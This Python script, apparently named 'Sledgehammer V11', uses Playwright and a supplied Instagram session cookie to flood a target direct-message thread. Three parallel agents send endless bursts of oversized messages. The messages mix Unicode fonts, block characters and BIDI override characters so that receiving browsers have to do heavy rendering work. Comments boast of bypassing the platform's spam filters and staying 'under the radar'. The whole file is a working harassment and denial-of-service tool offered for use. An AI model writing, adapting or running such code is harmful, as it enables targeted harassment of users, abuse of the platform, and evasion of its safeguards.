# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SLEDGEHAMMER V11)
# 📅 STATUS: VISIBLE-IMPACT | 30-MPS | TOTAL-OVERLOAD

import os, asyncio, random, sys
from playwright.async_api import async_playwright

AGENT_COUNT = 3 

def get_sledgehammer_payload(agent_id):
    """Bypasses filters by using valid but 'expensive' character sets."""
    u_id = random.randint(100, 999)
    
    # 💥 THE SLEDGEHAMMER HEADER
    # Mixing different alphabets prevents the server from flagging it as 'Zalgo'
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 𝖮𝖶𝖭𝖲 👑\n⚠️ SYSTEM_LOCK_{u_id} ⚠️\n"
    
    # 🏗️ THE 'FONT-BOMB' 
    # We mix scripts: 
    # [A] Standard [B] Mathematical [C] Full-width [D] Bold Fraktur
    # The browser must recalculate the text metrics for every single swap.
    body = []
    for i in range(110):
        line = (
            f"𝕻{i} 𝘗{i} Ｐ{i} 𝑷{i} "  # 4 different font fallback searches
            f"░▒▓█ {i} █▓▒░ "          # Raster-heavy block
            f"\u202E TEAM_DEVEL_OWNED \u202D" # Single BIDI flip (safe but heavy)
        )
        body.append(line)
        
    return (header + "\n".join(body))[:9980]

async def run_striker(agent_id, context, target_id):
    # Shorten stagger to 2s to hit the server harder now that we are 'clean'
    await asyncio.sleep(agent_id * 2) 
    page = await context.new_page()
    await page.route("**/*.{png,jpg,jpeg,svg,mp4}", lambda route: route.abort())
    
    try:
        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Launching Sledgehammer...")
        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="commit", timeout=120000)
        
        while True:
            try:
                box = page.get_by_role("textbox", name="Message")
                await box.wait_for(state="visible", timeout=30000)

                for _ in range(35):
                    payload = get_sledgehammer_payload(agent_id)
                    await box.fill(payload)
                    await page.keyboard.press("Enter")
                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Strike Delivered")
                    # Maximum speed saturation
                    await asyncio.sleep(0.2) 
                
                # Short rest to stay under the radar
                await asyncio.sleep(3) 

            except Exception:
                await asyncio.sleep(5)
                if not await page.get_by_role("textbox", name="Message").is_visible():
                    await page.reload(wait_until="commit")

    except Exception as e:
        print(f"❌ [Agent-{agent_id}] Error: {str(e)[:50]}")

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu"])
        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        tasks = [run_striker(i+1, context, target_id) for i in range(AGENT_COUNT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
